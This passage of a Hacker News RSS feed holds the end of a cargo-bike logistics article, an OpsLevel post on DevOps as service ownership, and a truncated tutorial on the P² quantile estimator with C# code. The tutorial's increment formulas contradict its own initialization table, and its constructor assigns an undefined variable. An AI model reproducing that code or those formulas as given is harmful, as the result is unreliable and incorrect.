data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p><p>as the crow flies routes for three vans (max capacity of 50 parcels due to time constraints, total distance 65km)</p></div></div><br><div><div id="attachment_8472"><p><img src="https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubbys-vans.png?resize=405%2C262&amp;ssl=1" alt="" width="405" height="262" srcset="https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubbys-vans.png?w=662&amp;ssl=1 662w, https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubbys-vans.png?resize=300%2C194&amp;ssl=1 300w" sizes="(max-width: 405px) 100vw, 405px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubbys-vans.png?w=662&amp;ssl=1 662w, https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubbys-vans.png?resize=300%2C194&amp;ssl=1 300w" data-lazy-src="https://i1.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/grubbys-vans.png?resize=405%2C262&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p><p>as the crow flies routes for five cargo bikes (max capacity of 30 parcels parcels due to volume, total distance 62km)</p></div></div><p>For the final job, we look at 188 densely distributed drops for Freddie’s flowers. Because of the condensed nature of the drops we assume a single deliverer can do up to 70 drops in a day. We thus do the comparison with three vans. Here, a Pedal Me cargo bike can carry up to 36 packages (although specifically designed flat bed cargo bikes can carry 55+).</p><div id="attachment_8473"><p><img src="https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-drops.png?resize=511%2C415&amp;ssl=1" alt="" width="511" height="415" srcset="https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-drops.png?resize=1024%2C831&amp;ssl=1 1024w, https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-drops.png?resize=300%2C243&amp;ssl=1 300w, https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-drops.png?resize=768%2C623&amp;ssl=1 768w, https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-drops.png?w=1186&amp;ssl=1 1186w" sizes="(max-width: 511px) 100vw, 511px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-drops.png?resize=1024%2C831&amp;ssl=1 1024w, https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-drops.png?resize=300%2C243&amp;ssl=1 300w, https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-drops.png?resize=768%2C623&amp;ssl=1 768w, https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-drops.png?w=1186&amp;ssl=1 1186w" data-lazy-src="https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-drops.png?resize=511%2C415&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p><p>The red icon represents the pickups and blue represent the drops</p></div><br><div><div id="attachment_8474"><p><img src="https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-vans.png?resize=445%2C267&amp;ssl=1" alt="" width="445" height="267" srcset="https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-vans.png?w=656&amp;ssl=1 656w, https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-vans.png?resize=300%2C180&amp;ssl=1 300w" sizes="(max-width: 445px) 100vw, 445px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-vans.png?w=656&amp;ssl=1 656w, https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-vans.png?resize=300%2C180&amp;ssl=1 300w" data-lazy-src="https://i0.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-vans.png?resize=445%2C267&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p><p>as the crow flies routes for three vans (max capacity of 80 parcels for time constraints, total distance 44km)</p></div></div><br><div><div id="attachment_8475"><p><img src="https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-bikes.png?resize=434%2C254&amp;ssl=1" alt="" width="434" height="254" srcset="https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-bikes.png?w=656&amp;ssl=1 656w, https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-bikes.png?resize=300%2C176&amp;ssl=1 300w" sizes="(max-width: 434px) 100vw, 434px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-bikes.png?w=656&amp;ssl=1 656w, https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-bikes.png?resize=300%2C176&amp;ssl=1 300w" data-lazy-src="https://i2.wp.com/pedalme.co.uk/wp-content/uploads/2020/11/freddies-bikes.png?resize=434%2C254&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p><p>as the crow flies routes for six cargo bikes (max constraint of 36 parcels due to volume, total distance 55km).</p></div></div><p>This time, the total distance for vans was of 44km for vans and 55km for cargo bikes. While the larger capacity leads to more efficient logistics for vans, the difference can be largely explained by the initial distance from the depot (red dot) to the first drop for all riders (approx. 1.5km x 6 riders). This could have perhaps been saved by e.g. organising a mobile sub-hub for the bikes to collect from (e.g. with a trailer). It may also be interesting to note that it is particularly in densely located drops like this that cargo bikes benefit most from time saved from parking when compared to cars and vans.</p><p>Overall, these examples show that cargo bikes are extremely competitive for larger scale logistics. Rather than being hindered by their smaller capacity, cargo bikes can result in globally more efficient routes for deliveries when the load is distributed between more vehicles.</p><p>To summarise, we have seen that e-cargo bikes benefit from several advantages when compared to vans and cars: They move faster, they are able to park closer to drop locations without wasting unnecessary time looking for a space, and have shorter routes across the city. Finally, we saw that their smaller capacity (in terms of weight and volume) can lead to more efficient routes overall because deliveries are distributed amongst more vehicles.</p><p>This competitive advantage with vans can only be true if the available capacity of e-cargo bikes is used to their full potential. In the next section, we explain how at Pedal Me, our riders are trained to do just that.</p><h2>2. Understanding and leveraging the full potential of e-cargo bikes</h2><p>An e-cargo bike can carry up to 150kg, with trailers adding in an additional 150kg. The loads transported by Pedal Me around London are impressive to many, and customers are often surprised by the volume and weight they can hold.</p><p>Since the beginning of the company, Pedal Me has led an important R&amp;D program to train riders into using cargo bikes at their full capacity in a safe and professional way. The curriculum, which involves on-road training, maneuvering of the bike, loading, and navigation, is City and Guilds assured and trains riders to be predictable, professional, and communicative road users.</p><p>While studies point at a <a href="https://www.lowtechmagazine.com/2012/09/jobs-of-the-future-cargo-cyclist.html">wide range</a> of <a href="https://ecf.com/news-and-events/news/cargo-bike-crazy-potential-delivering-goods-bike-0">estimates</a> for <a href="https://www.sciencedirect.com/science/article/pii/S2352146516000478">the proportion</a> of <a href="https://etrr.springeropen.com/articles/10.1007/s12544-017-0246-8">van journeys</a> replaceable by cargo bikes in urban areas (anywhere between 10-90%, although often in the lower ranges), …</p></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pedalme.co.uk/why-cargo-bikes/">https://pedalme.co.uk/why-cargo-bikes/</a></em></p>]]>
            </description>
            <link>https://pedalme.co.uk/why-cargo-bikes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25201188</guid>
            <pubDate>Tue, 24 Nov 2020 18:13:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Taking Back DevOps]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25201166">thread link</a>) | @semicolon
<br/>
November 24, 2020 | https://www.opslevel.com/2020/11/18/taking-back-devops/ | <a href="https://web.archive.org/web/*/https://www.opslevel.com/2020/11/18/taking-back-devops/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <h2 id="lets-get-devops-to-mean-service-ownership-again">Let’s get DevOps to mean Service Ownership again.</h2>
<h3 id="we-broke-devops-and-its-preventing-us-from-building">We broke DevOps. And it’s preventing us from building.</h3>
<p>When the first cloud providers emerged in the mid-2000s, they unlocked a new superpower: the ability to near-instantly provision hardware. Service-oriented architecture and microservices developed as a new architectural pattern. As a result, DevOps emerged as a practice to organize engineering teams around those new services - combining development and operations responsibilities onto the same team.</p>

<p>In 2006, Werner Vogels, CTO at Amazon, described DevOps as: “You build it, you run it.” Fast forward to today and DevOps is a far cry from these origins. Code is no longer deployed efficiently, and the practice of DevOps has weakened. Here’s how this happened:</p>

<h4 id="1-we-rendered-the-term-devops-meaningless">1. We rendered the term DevOps meaningless.</h4>

<p>Over the last several years, DevOps has become simultaneously a practice, a culture, a team, a job title, and a vendor product. You can hire some DevOps, buy some DevOps, adopt DevOps, and sprinkle a little bit of DevOps on top for good measure.</p>
<ul>
  <li><strong>‘DevOps’ is a team</strong>, responsible for horizontal engineering concerns like standardized CI/CD and observability.</li>
  <li><strong>‘DevOps’ is a trendy job title</strong>, merely renamed from “Operations”.</li>
  <li><strong>‘DevOps’ is a vendor product</strong>, like “Azure DevOps”, “ServiceNow Enterprise DevOps”, and “IBM DevOps”.</li>
</ul>

<h4 id="2-we-spent-way-too-much-time-debating-microservices-vs-monolith">2. We spent way too much time debating microservices vs monolith.</h4>

<p>This is the wrong debate. And it’s distracted teams from focusing on how to own and operate code efficiently. For some companies, a monolith works just fine. For others, microservices is the way to go. For many, it’s a hybrid of fat services or serverless or applications or some other mix. The more important question is: <em>How do you get your team to a place where engineers own the code they write so everyone can ship faster and safer?</em></p>

<h4 id="3-we-built-some-devops-tools-but-for-crucial-needs-were-stuck-in-spreadsheets">3. We built some DevOps tools, but for crucial needs we’re stuck in spreadsheets.</h4>

<p>DevOps tools are siloed around monitoring, logging, tracing, incident management, CI/CD, etc. But there is nothing that unifies the information from those tools to answer broad questions about production architecture. Companies with the best DevOps cultures use this set of siloed tools, but they have also spent millions of dollars to <em>build their own</em> tools and systems–everything from lists of owners to full-fledged internal tools. We’ve seen teams with:</p>
<ul>
  <li><strong>Giant wikis of services</strong> that answer basic questions about architecture, including simply who owns what.</li>
  <li><strong>Spreadsheets of services</strong> that are painstakingly created (and later tossed away) during engineering initiatives like upgrades or security improvements across a large and complex architecture.</li>
  <li>Eventually spreadsheets and wikis are thrown away and <strong>complex internal tools</strong> are created that require a lot of engineering resources to build and maintain.</li>
</ul>

<p>Building these stop-gap solutions are a huge barrier to entry; there needs to be a way for <em>all</em> teams to adopt DevOps culture.</p>

<h3 id="lets-take-back-devops">Let’s take back DevOps.</h3>
<p><strong>If we want to get back to shipping code even faster, more securely, and with less risk, we need to reset DevOps so that it’s synonymous with <em>Service Ownership</em>.</strong></p>

<p>When DevOps = Service ownership, teams get:</p>
<ul>
  <li><strong>Autonomy:</strong> Teams fully control how their systems are built and run in production. Architecture becomes less prescriptive.</li>
  <li><strong>Speed:</strong> As long as your team’s SLOs are being met, there should be nothing stopping you from shipping quickly.</li>
  <li><strong>Resiliency:</strong> Shifting reliability and security concerns to dev teams naturally increases risk, but ownership involves educating/measuring teams against critical practices so that they can still deploy with low risk.</li>
  <li><strong>Accountability:</strong> People are no longer paged because a service goes haywire - or, worse yet, has a security breach - and learn that nobody owns the service, wants to touch it, or even knows anything about it.</li>
</ul>

<p>We’ve underinvested in tools to make DevOps actually work. There’s a lot we still need to build to help engineering teams adopt service ownership and unlock the full power of DevOps.</p>

<hr>

<h3 id="opslevel-enables-service-ownership-its-the-future-of-devops">OpsLevel enables Service Ownership. It’s the future of DevOps.</h3>

<p>OpsLevel helps DevOps teams own, operate, and understand their entire production infrastructure. You can easily catalog all your services, tools, ownership, and changes, while you continuously measure and improve how you build and operate your software. Teams ship faster, with confidence.</p>

<p>Forward-thinking engineering teams at Segment, Zapier, Auth0, Convoy, Under Armour, Chegg, and more use OpsLevel to drive service ownership. <strong>We’re proud to announce we’ve raised $5M in funding led by Vertex Ventures, with participation from S28 Capital, Webb Investment Network, Union Capital, and a number of angels</strong> including:</p>
<ul>
  <li>Alex Solomon, Andrew Miklas, and Baskar Puvanathasan (founders of PagerDuty)</li>
  <li>Anne Raimondi (CCO of Guru, Board member Asana, Gusto, Patreon)</li>
  <li>Frederic Kerrest (Executive Vice Chairman, COO, and co-founder of Okta)</li>
  <li>Jean-Michel Lemieux (CTO of Shopify)</li>
  <li>Maynard Webb (ex-COO of eBay)</li>
  <li>Yuri Sagalov (co-founder of AeroFS)</li>
  <li>Evan Weaver (CTO and co-founder of Fauna)</li>
  <li>Paul Judge (co-founder of Pindrop Security)</li>
  <li>Bill Clerico (co-founder of WePay)</li>
</ul>

<p>If you’re interested in joining our mission to take back DevOps and empower cultures of service ownership, <a href="https://www.opslevel.com/careers/">check out our open roles</a>.</p>

<p><em><a href="https://www.linkedin.com/in/john-laban/">John Laban</a> and <a href="https://www.linkedin.com/in/klprose/">Ken Rose</a> are co-founders of OpsLevel. John was previously PagerDuty’s first engineer and the pair of them bring senior technical expertise from Shopify, Amazon, and more.  They’ve spent the last decade scaling engineering teams and helping them transition to DevOps and service ownership.</em></p>

                </div></div>]]>
            </description>
            <link>https://www.opslevel.com/2020/11/18/taking-back-devops/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25201166</guid>
            <pubDate>Tue, 24 Nov 2020 18:11:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[P² quantile estimator – estimating the median without storing values]]>
            </title>
            <description>
<![CDATA[
Score 120 | Comments 41 (<a href="https://news.ycombinator.com/item?id=25201093">thread link</a>) | @ciprian_craciun
<br/>
November 24, 2020 | https://aakinshin.net/posts/p2-quantile-estimator/ | <a href="https://web.archive.org/web/*/https://aakinshin.net/posts/p2-quantile-estimator/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span><time datetime="2020-11-24">November 24, 2020</time>
&nbsp;&nbsp;
<i></i>&nbsp;
<a href="https://aakinshin.net/tags/statistics/">Statistics</a>
<a href="https://aakinshin.net/tags/quantiles/">Quantiles</a>
<a href="https://aakinshin.net/tags/performance-telemetry/">Performance Telemetry</a></span></p><p>Imagine that you are implementing performance telemetry in your application.
There is an operation that is executed millions of times, and you want to get its “average” duration.
It’s not a good idea to use the arithmetic mean because the obtained value can be easily spoiled by outliers.
It’s much better to use the median which is one of the most robust ways to describe the average.</p><p>The straightforward median estimation approach requires storing all the values.
In our case, it’s a bad idea to keep all the values because it will significantly increase the memory footprint.
Such telemetry is harmful because it may become a new bottleneck instead of monitoring the actual performance.</p><p>Another way to get the median value is to use a sequential quantile estimator
(also known as an online quantile estimator or a streaming quantile estimator).
This is an algorithm that allows calculating the median value (or any other quantile value)
using a fixed amount of memory.
Of course, it provides only an approximation of the real median value,
but it’s usually enough for typical telemetry use cases.</p><p>In this post, I will show one of the simplest sequential quantile estimators that is called the P² quantile estimator
(or the Piecewise-Parabolic quantile estimator).</p><h3 id="the-p-quantile-estimator">The P² quantile estimator</h3><p>This algorithm was initially suggested in <a href="#Jain1985">[Jain1985]</a>.
Below you can find a short overview of this approach,
notes about typos in the original paper,
numerical simulation,
and a C# implementation.</p><h4 id="the-main-idea">The main idea</h4><p>Let’s say we have a stream of observations <span>\(\{ x_0, x_1, x_2, x_3, x_4, \ldots \}\)</span>
and we want to estimate p-quantile.
The suggested approach introduces five markers that correspond to the estimations of</p><ul><li><span>\(q_0\)</span>: The minimum</li><li><span>\(q_1\)</span>: The (p/2)-quantile</li><li><span>\(q_2\)</span>: The p-quantile</li><li><span>\(q_3\)</span>: The ((1+p)/2)-quantile</li><li><span>\(q_4\)</span>: The maximum</li></ul><p>The <span>\(q_i\)</span> values are known as the marker heights.</p><p>Also, we have to maintain the marker positions <span>\(\{ n_0, n_1, n_2, n_3, n_4 \}\)</span>.
These integer values describe actual marker indexes across obtained observations at the moment.</p><p>Next, we have to define the marker desired positions <span>\(\{ n'_0, n'_1, n'_2, n'_3, n'_4 \}\)</span>.
For the first <span>\(n\)</span> observations, these real values are defined as follows:</p><ul><li><span>\(n'_0 = 0\)</span></li><li><span>\(n'_1 = (n - 1) p / 2\)</span></li><li><span>\(n'_2 = (n - 1) p\)</span></li><li><span>\(n'_3 = (n - 1) (1 + p) / 2\)</span></li><li><span>\(n'_4 = (n - 1)\)</span></li></ul><p>In order to speed up the algorithm, we can precalculate increments of the desired positions which
should be added to the current values after each new observation:</p><ul><li><span>\(dn'_0 = 0\)</span></li><li><span>\(dn'_1 = p / 2\)</span></li><li><span>\(dn'_2 = (n - 1) p\)</span></li><li><span>\(dn'_3 = (n - 1) (1 + p) / 2\)</span></li><li><span>\(dn'_4 = (n - 1)\)</span></li></ul><p>Note that in the original paper, the authors use one-based indexing.
I decided to adapt it to the zero-based indexing which is more convenient from the implementation point of view.</p><h4 id="initialization">Initialization</h4><p>Once we collected the first five elements, we should perform initialization logic:</p><p><span>\[\left\{
\begin{array}{llll}
q_0 = x_{(0)}, &amp; n_0 = 0, &amp; n'_0 = 0,      &amp; dn'_0 = 0,\\
q_1 = x_{(1)}, &amp; n_1 = 1, &amp; n'_1 = 2p,     &amp; dn'_1 = p/2,\\
q_2 = x_{(2)}, &amp; n_2 = 2, &amp; n'_2 = 4p,     &amp; dn'_2 = p,\\
q_3 = x_{(3)}, &amp; n_3 = 3, &amp; n'_3 = 2 + 2p, &amp; dn'_3 = (1+p)/2,\\
q_4 = x_{(4)}, &amp; n_4 = 4, &amp; n'_4 = 4,      &amp; dn'_4 = 1.
\end{array}
\right.
\]</span></p><h4 id="marker-invalidation">Marker invalidation</h4><p>For each <span>\(x_j\)</span> for <span>\(j \geq 5\)</span>, we should invalidate our markers.</p><p>Firstly, we should adjust extreme marker heights
(if <span>\(x_j &lt; q_0\)</span>, we should update <span>\(q_0\)</span>; if <span>\(x_j &gt; q_4\)</span>, we should update <span>\(q_4\)</span>) and
find <span>\(k\)</span> such that <span>\(q_k \leq x_j &lt; q_{k+1}\)</span>
(or <span>\(q_k \leq x_j \leq q_{k+1}\)</span> for <span>\(k=3\)</span>):</p><table><thead><tr><th>Condition</th><th><span>\(q_i\)</span> update</th><th>k</th></tr></thead><tbody><tr><td><span>\(\phantom{q_0 \leq~} x_j &lt; q_0\)</span></td><td><span>\(q_0 = x_j\)</span></td><td>0</td></tr><tr><td><span>\(q_0 \leq x_j &lt; q_1\)</span></td><td></td><td>0</td></tr><tr><td><span>\(q_1 \leq x_j &lt; q_2\)</span></td><td></td><td>1</td></tr><tr><td><span>\(q_2 \leq x_j &lt; q_3\)</span></td><td></td><td>2</td></tr><tr><td><span>\(q_3 \leq x_j &lt; q_4\)</span></td><td></td><td>3</td></tr><tr><td><span>\(q_4 \leq x_j\)</span></td><td><span>\(q_4 = x_j\)</span></td><td>3</td></tr></tbody></table><p>Secondly, we should update the marker positions and the marker desired positions:</p><p><span>\[\begin{array}{lcl}
n_i = n_i + 1 &amp; \textrm{for} &amp; i = k + 1, \ldots, 4; \\
n'_i = n'_i + dn'_i &amp; \textrm{for} &amp; i = 0, \ldots, 4. \\
\end{array}
\]</span></p><p>Finally, we should adjust non-extreme marker heights (<span>\(q_i\)</span>) and positions (<span>\(n_i\)</span>) for <span>\(i \in \{ 1, 2, 3\} \)</span>
in the following way:</p><div><pre><code data-lang="cs"><span>for</span> <span>(</span><span>i</span> <span>=</span> <span>1</span><span>;</span> <span>i</span> <span>&lt;=</span> <span>3</span><span>;</span> <span>i</span><span>++)</span>
<span>{</span>
    <span>d</span> <span>=</span> <span>nꞌ</span><span>[</span><span>i</span><span>]</span> <span>-</span> <span>n</span><span>[</span><span>i</span><span>]</span>
    <span>if</span> <span>(</span><span>d</span> <span>&gt;=</span>  <span>1</span> <span>&amp;&amp;</span> <span>n</span><span>[</span><span>i</span> <span>+</span> <span>1</span><span>]</span> <span>-</span> <span>n</span><span>[</span><span>i</span><span>]</span> <span>&gt;</span>  <span>1</span> <span>||</span>
        <span>d</span> <span>&lt;=</span> <span>-</span><span>1</span> <span>&amp;&amp;</span> <span>n</span><span>[</span><span>i</span> <span>-</span> <span>1</span><span>]</span> <span>-</span> <span>n</span><span>[</span><span>i</span><span>]</span> <span>&lt;</span> <span>-</span><span>1</span><span>)</span>
    <span>{</span>
        <span>d</span> <span>=</span> <span>sign</span><span>(</span><span>d</span><span>)</span>
        <span>qꞌ</span> <span>=</span> <span>Parabolic</span><span>(</span><span>i</span><span>,</span> <span>d</span><span>)</span>
        <span>if</span> <span>(!(</span><span>q</span><span>[</span><span>i</span> <span>-</span> <span>1</span><span>]</span> <span>&lt;</span> <span>qꞌ</span> <span>&amp;&amp;</span> <span>qꞌ</span> <span>&lt;</span> <span>q</span><span>[</span><span>i</span> <span>+</span> <span>1</span><span>]))</span>
            <span>qꞌ</span> <span>=</span> <span>Linear</span><span>(</span><span>i</span><span>,</span> <span>d</span><span>)</span>
        <span>q</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>qꞌ</span>
        <span>n</span><span>[</span><span>i</span><span>]</span> <span>+=</span> <span>d</span>
    <span>}</span>
<span>}</span>
</code></pre></div><p>The core equation of the algorithm is a piecewise-parabolic prediction (P²) formula
that adjusts marker heights for each observation:</p><p><span>\[q'_i = q_i + \dfrac{d}{n_{i+1}-n_{i-1}} \cdot
\Bigg(
(n_i-n_{i-1}+d)\dfrac{q_{i+1}-q_i}{n_{i+1}-n_i} +
(n_{i+1}-n_i-d)\dfrac{q_i-q_{i-1}}{n_i-n_{i-1}}
\Bigg).
\]</span></p><p>Once we calculated <span>\(q'_i\)</span>, we should check that <span>\(q_{i-1} &lt; q'_i &lt; q_{i+1}\)</span>.
If this condition is false, we should ignore the parabolic prediction and use the linear prediction instead:</p><p><span>\[q'_i = q_i + d \dfrac{q_{i+d}-q_i}{n_{i+d}-n_{i}}.
\]</span></p><h4 id="the-result">The result</h4><p>Once you need the requested quantile estimation value, we should just take the value of <span>\(q_2\)</span>.</p><h4 id="typos-in-the-original-paper">Typos in the original paper</h4><p>A find a few typos in the original paper which may confuse readers who want to implement the algorithm from scratch:</p><ul><li>Page 1079, Box 1, B2:
<code>$i = k, \ldots, 5$</code>
should be replaced by
<code>$i = k + 1, \ldots, 5$</code></li><li>Page 1079, Box 1, B3:
<code>$\textbf{THEN}\; q_i \leftarrow q_i$</code>
should be replaced by
<code>$\textbf{THEN}\; q_i \leftarrow q'_i$</code></li></ul><h3 id="numerical-simulation">Numerical simulation</h3><p>It’s time to check how it works.
I decided to visualize sequential values of the following quantiles estimator:</p><ul><li><strong>The P² quantile estimator</strong><br>A sequential estimator that is described above.</li><li><strong>The Type 7 quantile estimator</strong><br>It’s the most popular quantile estimator which is used by default in
R, Julia, NumPy, Excel (<code>PERCENTILE</code>, <code>PERCENTILE.INC</code>), Python (<code>inclusive</code> method).
We call it “Type 7” according to notation from <a href="#Hyndman1996">[Hyndman1996]</a>,
where Rob J. Hyndman and Yanan Fan described nine quantile algorithms which are used in statistical computer packages.</li><li><strong>The Harrell-Davis quantile estimator</strong><br>It’s my favorite option in real life for non-sequential cases because
it’s more robust than classic quantile estimators based on linear interpolation,
and it provides more reliable estimations on small samples.
This quantile estimator is described in <a href="#Harrell1982">[Harrell1982]</a>.</li><li><strong>Actual</strong><br>The true median value which is taken from the underlying distribution.</li></ul><p>Below, you can find several plots for the following distributions:</p><ul><li><strong>Normal distribution</strong> <span>\(\mathcal{N}(0, 1)\)</span></li><li><strong>Gumbel distribution</strong> for <span>\(\mu = 0, \beta = 1\)</span></li><li><strong>Beta distribution</strong> <span>\(\textrm{Beta}(10, 2)\)</span></li><li><strong>Uniform distribution</strong> <span>\(\mathcal{U}(0, 1)\)</span></li><li><strong>Bimodal distribution</strong> (mixture of <span>\(\mathcal{N}(10, 1)\)</span> and <span>\(\mathcal{N}(20, 1)\)</span>)</li></ul><p>Here are the results:</p><div><div><a href="https://aakinshin.net/posts/p2-quantile-estimator/img/normal-light.svg" target="_blank" alt="normal"><picture>
<source theme="dark" srcset="https://aakinshin.net/posts/p2-quantile-estimator/img/normal-dark.svg" media="(prefers-color-scheme: dark)"><source theme="light" srcset="https://aakinshin.net/posts/p2-quantile-estimator/img/normal-light.svg" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"><img width="800" src="https://aakinshin.net/posts/p2-quantile-estimator/img/normal-light.svg"></picture></a></div></div><br><div><div><a href="https://aakinshin.net/posts/p2-quantile-estimator/img/gumbel-light.svg" target="_blank" alt="gumbel"><picture>
<source theme="dark" srcset="https://aakinshin.net/posts/p2-quantile-estimator/img/gumbel-dark.svg" media="(prefers-color-scheme: dark)"><source theme="light" srcset="https://aakinshin.net/posts/p2-quantile-estimator/img/gumbel-light.svg" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"><img width="800" src="https://aakinshin.net/posts/p2-quantile-estimator/img/gumbel-light.svg"></picture></a></div></div><br><div><div><a href="https://aakinshin.net/posts/p2-quantile-estimator/img/beta-light.svg" target="_blank" alt="beta"><picture>
<source theme="dark" srcset="https://aakinshin.net/posts/p2-quantile-estimator/img/beta-dark.svg" media="(prefers-color-scheme: dark)"><source theme="light" srcset="https://aakinshin.net/posts/p2-quantile-estimator/img/beta-light.svg" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"><img width="800" src="https://aakinshin.net/posts/p2-quantile-estimator/img/beta-light.svg"></picture></a></div></div><br><div><div><a href="https://aakinshin.net/posts/p2-quantile-estimator/img/uniform-light.svg" target="_blank" alt="uniform"><picture>
<source theme="dark" srcset="https://aakinshin.net/posts/p2-quantile-estimator/img/uniform-dark.svg" media="(prefers-color-scheme: dark)"><source theme="light" srcset="https://aakinshin.net/posts/p2-quantile-estimator/img/uniform-light.svg" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"><img width="800" src="https://aakinshin.net/posts/p2-quantile-estimator/img/uniform-light.svg"></picture></a></div></div><br><div><div><a href="https://aakinshin.net/posts/p2-quantile-estimator/img/bimodal-light.svg" target="_blank" alt="bimodal"><picture>
<source theme="dark" srcset="https://aakinshin.net/posts/p2-quantile-estimator/img/bimodal-dark.svg" media="(prefers-color-scheme: dark)"><source theme="light" srcset="https://aakinshin.net/posts/p2-quantile-estimator/img/bimodal-light.svg" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"><img width="800" src="https://aakinshin.net/posts/p2-quantile-estimator/img/bimodal-light.svg"></picture></a></div></div><p>As you can see, The P² quantile estimator produces reasonable median estimates.
I also checked how it works on a considerable number of real data sets and
I’m pretty satisfied with the results.
You can also find a discussion about accuracy and the equation for the mean squared error in the original paper.</p><h3 id="reference-implementation">Reference implementation</h3><p>Below you can find a C# implementation of the discussed algorithm.
Also, you can use it via
the latest nightly version (0.3.0-nightly.64+) of <a href="https://github.com/AndreyAkinshin/perfolizer">perfolizer</a>.</p><div><pre><code data-lang="cs"><span>public</span> <span>class</span> <span>P2QuantileEstimator</span>
<span>{</span>
    <span>private</span> <span>readonly</span> <span>double</span> <span>p</span><span>;</span>
    <span>private</span> <span>readonly</span> <span>int</span><span>[]</span> <span>n</span> <span>=</span> <span>new</span> <span>int</span><span>[</span><span>5</span><span>];</span> <span>// marker positions
</span><span></span>    <span>private</span> <span>readonly</span> <span>double</span><span>[]</span> <span>ns</span> <span>=</span> <span>new</span> <span>double</span><span>[</span><span>5</span><span>];</span> <span>// desired marker positions
</span><span></span>    <span>private</span> <span>readonly</span> <span>double</span><span>[]</span> <span>dns</span> <span>=</span> <span>new</span> <span>double</span><span>[</span><span>5</span><span>];</span>
    <span>private</span> <span>readonly</span> <span>double</span><span>[]</span> <span>q</span> <span>=</span> <span>new</span> <span>double</span><span>[</span><span>5</span><span>];</span> <span>// marker heights
</span><span></span>    <span>private</span> <span>int</span> <span>count</span><span>;</span>

    <span>public</span> <span>P2QuantileEstimator</span><span>(</span><span>double</span> <span>p</span><span>)</span>
    <span>{</span>
        <span>p</span> <span>=</span> <span>probability</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>AddValue</span><span>(</span><span>double</span> <span>x</span><span>)</span>
    <span>{</span>
        <span>if</span> <span>(</span><span>count</span> <span>&lt;</span> <span>5</span><span>)</span>
        <span>{</span>
            <span>q</span><span>[</span><span>count</span><span>++]</span> <span>=</span> <span>x</span><span>;</span>
            <span>if</span> <span>(</span><span>count</span> <span>==</span> <span>5</span><span>)</span>
            <span>{</span>
                <span>Array</span><span>.</span><span>Sort</span><span>(</span><span>q</span><span>);</span>

                <span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>5</span><span>;</span> <span>i</span><span>++)</span>
                    <span>n</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>i</span><span>;</span>

                <span>ns</span><span>[</span><span>0</span><span>]</span> <span>=</span> <span>0</span><span>;</span>
                <span>ns</span><span>[</span><span>1</span><span>]</span> <span>=</span> <span>2</span> <span>*</span> <span>p</span><span>;</span>
                <span>ns</span><span>[</span><span>2</span><span>]</span> <span>=</span> <span>4</span> <span>*</span> <span>p</span><span>;</span>
